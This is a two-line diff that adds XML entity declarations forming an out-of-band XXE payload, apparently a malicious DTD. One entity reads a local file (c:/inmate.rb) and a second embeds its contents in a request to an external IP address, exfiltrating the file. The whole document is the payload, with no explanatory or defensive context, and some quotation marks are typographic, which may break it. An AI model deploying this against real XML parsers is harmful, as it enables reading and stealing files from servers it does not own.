@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM “file:///c:/inmate.rb”>
+<!ENTITY % ext “<!ENTITY hehe SYSTEM ‘http://128.199.141.142/?%data;'>">
